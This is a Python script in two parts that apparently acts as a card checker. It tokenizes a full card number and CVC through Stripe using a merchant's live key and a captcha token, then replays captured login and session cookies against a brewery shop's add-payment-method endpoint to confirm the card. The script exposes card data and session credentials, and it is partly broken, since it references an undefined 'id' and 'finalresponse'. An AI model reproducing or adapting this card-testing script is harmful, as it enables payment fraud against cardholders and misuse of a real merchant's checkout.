import requests

headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; Infinix X6832) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}

data = 'type=card&card[number]=4094+5100+0177+5995&card[cvc]=456&card[exp_year]=29&card[exp_month]=02&allow_redisplay=unspecified&billing_details[address][country]=NP&payment_user_agent=stripe.js%2F250b377966%3B+stripe-js-v3%2F250b377966%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.wiseacrebrew.com&time_on_page=52408&client_attribution_metadata[client_session_id]=b3363cd5-ca61-4aba-ae62-e10ba6162fd2&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=d32772c0-eae0-42bd-9464-3745b31d21af&guid=6d387101-35c1-4b7c-afde-99e3a8e440d389a0de&muid=44438353-1a9a-4d0f-b10f-2be80c43f63d88509b&sid=493f33e5-0d40-4d05-a0b6-5e49e27dd71669b2ab&key=pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYwMjg3NzAxLCJjZGF0YSI6IjI3ZDlOZ3dZODc3d0kwaUlyOTI0QlFYS3h2T0oyRnlwdFQ3KzBuM2ozVVYzak1NZU9Fbld1Yml3TGQvVEthanVjZWlUUTFzVkIvcURaTG5NY0RCSWZOSHc3TnRpczhHRkdnS1NYN3UvRnFqM0I5czg1d3AvVytNM2JtUUxJTGVpelhpL0hUOHFGQjlRbG5ObExVWVFnSjZ0MVpQdm5DanFWS2Z3aWFGR2tmbTBibHptYVU4NlV0d0NCK2xvcDRkcUk0cmsybjNvMUdrM29scTkiLCJwYXNza2V5IjoiYmhJaVl0dnFCdEQvUDI2cjdwL0MvZWYxMGZJWG1rck1wSGpwMWdnbnVibkMvQTVhL1EyMFJhM0h1ek9JTTVoTTNDVnRGN2JiNGo2eGdEd0kwZk9zWUdFM3ZiejMzcHhXQ2VKUVJkZ1RYMkZHeEpDQndocUlCYmVYbTFZeEphaVhyelFYbi9ySmtPbTVlQVlJeGp6RXBMU09sVzNlalhVcnZabmVQMG5KN3Q5amg4OUpQd0krMXoycnRyZTZleFZzM0FJUFg3YWNpRkM1TzJqKzJoOVV5b0xWeFNpRW1PWS8vNThHN21abVM2bXhkamlUSEZWbmNZSldBVnVuNXYyeWkyTjEzVmkxQlQvYmthL0ZLWTVlYnNJZXhtWm80OVM5bTFaZjB2Umh6SUk5TzA3aHNsSCtsNWNkUlVPSkx4TGhMTW1XaW1MMzVpK3FPS0wwejFHd2NpUzZSRXZtZFpkM2lPaVlDdWVlZDN4ajZxUTlGRW14WFBNK0dPTmRMeFNQSkhVeVh2aW0wSnhMTldrMC9pRVgyRkE3d05TaG1kM2RaNmZZUXBnaUJMdjFDVmxVeGlEYi90SXJ4VXFRbGxsdUU4aG1KZklDcmE1WGo4RGRKaTYvOGw1a2NlTGEwK1RPakFmWnFkMi8wOEN2NEcwbkY0RXBXQUJsYTdqVkxGN21KVDkrYVloNUlsWG94QlpaRnlCNy9WYTFDNXVuQloweFZBNWI2LzZqZk03YThFNzZvOTVPanVFOEt5V0lyOHJnVE91UEoxaWhlczRLcDduWkRUK2NJeUFoRlpIc1F4WGJzYTRJTk50SjY2YjdZRVR2UGxjTm5FTXJHZCtzTnBaRHg1TWZPek1PMFlFc0kvQmhJMncvYnFQWmV0MTREZnVWdXdOMGFIRmxpeFA2Q2ZQeTFENEtNRVBCNEgzTHZBMHNMaE9Ua1pZWWJpbjVEZTMxenU0L2dxalF4c2lOVis2YTdLdk1idnlFR01GY2I2NDRCQVJCUmw1V3A5UTQ1OUVsQjhyMVQwWldlZXYwc3duYnZhV0NTVFR3Qmh5eERNUlEvYStRbmFWRi95NlVQWkw3YndTaVpPSGRnZE9nbXNzKysrV1I0Nm5lRFh1QWNnNXFkcVdkbkZQVjl6NXgvRWFEcTIwZG9PSmZMWWE4elljYnIxNG5jdmMyT3l1NE9OUHdIcGlid3lPeGpUYVFZaGhyaGpzdHZvMk5CWUd5NElRM0JxeW9ReVhYbWliTUxMTVl0L2FibFo0VnBZbHBEbkpYblc0WG9sM3VYZllidjZkNWo1c2lLRmhsdjVUb1RzM2E1S2tmblhnRHBldmN2dlBlQ2lOc2VSdTVmTWpFM3JDMG1wMDNHN1MyVk80cnMvTWU3K0hTZHhxVUFZVFFWMVpPM1BVQ3ZXeDZsNktTOVRYelBZRVFLSEluUzIvUXI1NzUwLzZDR1VWZnhqbGZFR3VlSDR3M2NEWXE0S1VkQmJPc3ZwdlIzTmM4QUIvVDZBdkpoTkdYdzMwTElVNzdLV3FkWW5Ob0dkUStjT1FmNlBQeEhReXdIVEVwdi95aVJUa2hnbUVwdXNJUGRvZFRtdm9xU2ZUUW52R2llT2xtRmpocWZVYkVxdUxvQVJEN25YS1JZSHdNWjRteHN4MWFjbE9ud2FscU5YVEh0aGVJaSsrejF5STJMQ0xNc0hsOUgzdUg5S0plUmlrR2x0enlUVnY1dDFqMUR2UnJBK2FERzNGbm5GMUlvRGNkMVkzL2tsVSt5Q1dpQXpMa21wbDRSTXJSNkhwQXNSckRYZWdPZDRCWFRrV1p0YzF4eWdiVzNiZWlWdnZab2d5ZDFVT3BISDhIdXRXanpyV2UrQW5ISmZsR2I4WTNPZUJLMjNWQ3J0NXdBNnUyK0JQWWhEWklCbU9CdG1oOWxFRFUyWFUyb29sdlFrOERNMHV6TjBMRGNQTGkyTDRQS3hzK2dnWkdYUldySDFmb3dsaThDeDcxWVhzVU9Pd3dScDBua2NkNU1YYTFiVmdyak1POVdEMGJlM0tFQ1REZzRQR3pzRmcwOVhuVFY5UEgrcUZtS09VQ2MvdTZ1ZWt6bEIvTlMzbDVKdzNRT09iSDNGS0NrNERYQllxSnRSMGVtM2UxdVhYVEd2SEFXbHBCUmpFSUZtWExQUDIxQkRsaURnQ2xFYXZzYlhqMEVwZG1zbnZXSHlmNU1ZM1prbGw4bzg2VTEreitIa3BnYkhQRW1XRHR2OWEwT2hPZyIsImtyIjoiOGNjNzAyNCIsInNoYXJkX2lkIjoyNTkxODkzNTl9.KVW4zWAfSef5em2EndeFIzk87BmohPHslGRlZeGJ0XU'

response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

print(response.text)


import requests



cookies = {
    '_ga': 'GA1.1.87249588.1760241082',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-10-12%2003%3A21%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-10-12%2003%3A21%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'mtk_src_trk': '%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fshop.wiseacrebrew.com%2F%22%2C%22session_start_time%22%3A%222025-10-12%2003%3A21%3A22%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D',
    '__stripe_mid': '44438353-1a9a-4d0f-b10f-2be80c43f63d88509b',
    'wordpress_sec_dedd3d5021a06b0ff73c12d14c2f177c': 'kgamar706%7C1761450988%7CMrgtuiWidMmsk6gzBJz1zyMmCOCPhp4GKruodmQy5HD%7C036896d8cd94a4c9a41c631dd03fc5a33637068b4d401faeb690e8c2f822f9bd',
    'wordpress_logged_in_dedd3d5021a06b0ff73c12d14c2f177c': 'kgamar706%7C1761450988%7CMrgtuiWidMmsk6gzBJz1zyMmCOCPhp4GKruodmQy5HD%7C6a0239742c31d94f47eaa0e81f44078c1f63fd43156ddd5def7d3ef8b8851605',
    'wp_woocommerce_session_dedd3d5021a06b0ff73c12d14c2f177c': '451543%7C%7C1760413930%7C%7C1760410330%7C%7C3d18ae3c1fd91a6089bd4f78f475afe5',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': 'd233a743aae184380edea613bdf9bd12',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2013%3B%20Infinix%20X6832%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_current': '%C2%9E%C3%A9e',
    '__stripe_sid': '493f33e5-0d40-4d05-a0b6-5e49e27dd71669b2ab',
    'sbjs_session': 'pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2Faccount%2Fadd-payment-method%2F',
    '_ga_94LZDRFSLM': 'GS2.1.s1760285301$o2$g1$t1760286416$j36$l0$h0',
}

headers = {
    'authority': 'shop.wiseacrebrew.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_ga=GA1.1.87249588.1760241082; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-10-12%2003%3A21%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-10-12%2003%3A21%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; mtk_src_trk=%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fshop.wiseacrebrew.com%2F%22%2C%22session_start_time%22%3A%222025-10-12%2003%3A21%3A22%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D; __stripe_mid=44438353-1a9a-4d0f-b10f-2be80c43f63d88509b; wordpress_sec_dedd3d5021a06b0ff73c12d14c2f177c=kgamar706%7C1761450988%7CMrgtuiWidMmsk6gzBJz1zyMmCOCPhp4GKruodmQy5HD%7C036896d8cd94a4c9a41c631dd03fc5a33637068b4d401faeb690e8c2f822f9bd; wordpress_logged_in_dedd3d5021a06b0ff73c12d14c2f177c=kgamar706%7C1761450988%7CMrgtuiWidMmsk6gzBJz1zyMmCOCPhp4GKruodmQy5HD%7C6a0239742c31d94f47eaa0e81f44078c1f63fd43156ddd5def7d3ef8b8851605; wp_woocommerce_session_dedd3d5021a06b0ff73c12d14c2f177c=451543%7C%7C1760413930%7C%7C1760410330%7C%7C3d18ae3c1fd91a6089bd4f78f475afe5; woocommerce_items_in_cart=1; woocommerce_cart_hash=d233a743aae184380edea613bdf9bd12; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2013%3B%20Infinix%20X6832%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Mobile%20Safari%2F537.36; sbjs_current=%C2%9E%C3%A9e; __stripe_sid=493f33e5-0d40-4d05-a0b6-5e49e27dd71669b2ab; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2Faccount%2Fadd-payment-method%2F; _ga_94LZDRFSLM=GS2.1.s1760285301$o2$g1$t1760286416$j36$l0$h0',
    'origin': 'https://shop.wiseacrebrew.com',
    'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; Infinix X6832) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

params = {
    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
}

data = {
    'action': 'create_and_confirm_setup_intent',
    'wc-stripe-payment-method': id,
    'wc-stripe-payment-type': 'card',
    '_ajax_nonce': '9ffd7aea3d',
}

response = requests.post('https://shop.wiseacrebrew.com/', params=params, cookies=cookies, headers=headers, data=data)

print(finalresponse.json)
